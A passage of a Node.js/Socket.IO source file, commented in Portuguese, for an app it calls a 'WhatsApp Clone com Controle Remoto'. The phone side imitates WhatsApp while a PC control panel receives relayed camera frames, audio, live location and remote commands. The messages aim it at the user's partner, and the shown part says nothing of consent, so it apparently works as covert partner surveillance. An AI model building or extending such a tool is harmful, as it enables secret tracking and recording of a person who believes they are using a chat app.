        document.getElementById('emergencyBtn').addEventListener('click', () => {
            socket.emit('comando', 'emergency');
            addMessage('💥 Surpresa especial enviada! 💥', 'sent');
        });
        
        // Receber mensagens do celular
        socket.on('chat_message', (msg) => {
            addMessage(msg, 'received');
        });
        
        socket.on('typing_start', () => {
            chatStatus.innerHTML = 'digitando...';
        });
        
        socket.on('typing_stop', () => {
            chatStatus.innerHTML = 'online';
        });
        
        socket.on('connect', () => {
            addMessage('✨ Conectado ao WhatsApp do seu amor! ✨', 'received');
        });
        
        // Função para fechar modal
        window.closeModal = function() {
            document.getElementById('cameraModal').style.display = 'none';
        };
    </script>
</body>
</html>`);
  }
});

// Socket.IO lógica principal
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  // Mensagens de chat
  socket.on('chat_message', (msg) => {
    console.log('Mensagem:', msg);
    socket.broadcast.emit('chat_message', msg);
  });
  
  socket.on('audio_message', (audioData) => {
    socket.broadcast.emit('audio_message', audioData);
  });
  
  // Indicador de digitação
  socket.on('typing_start', () => {
    socket.broadcast.emit('typing_start');
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('typing_stop');
  });
  
  // Músicas do YouTube
  socket.on('play_youtube', (data) => {
    console.log('Tocando música:', data.songName);
    socket.broadcast.emit('play_youtube', data);
  });
  
  socket.on('stop_music', () => {
    socket.broadcast.emit('stop_music');
  });
  
  // Streaming de mídia
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('audio', (audioData) => {
    socket.broadcast.emit('audio', audioData);
  });
  
  // Comandos
  socket.on('comando', (cmd) => {
    console.log('Comando:', cmd);
    socket.broadcast.emit('comando', cmd);
  });
  
  // Localização
  socket.on('location', (loc) => {
    socket.broadcast.emit('location', loc);
  });
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✨ WhatsApp Clone com Controle Remoto! ✨`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   Acesse no PC e no Celular na mesma rede`);
  console.log(`\n📱 No CELULAR: Interface 100% WhatsApp`);
  console.log(`💻 No PC: Painel de controle completo`);
  console.log(`\nFuncionalidades:`);
  console.log(`   💬 Chat igual ao WhatsApp`);
  console.log(`   📷 Controle de câmera`);
  console.log(`   🎤 Controle de áudio`);
  console.log(`   📍 Localização em tempo real`);
  console.log(`   🎵 Músicas em segundo plano`);
  console.log(`   📳 Vibração e surpresas`);
  console.log(`\n💕 Acesse: http://localhost:${PORT}\n`);
});
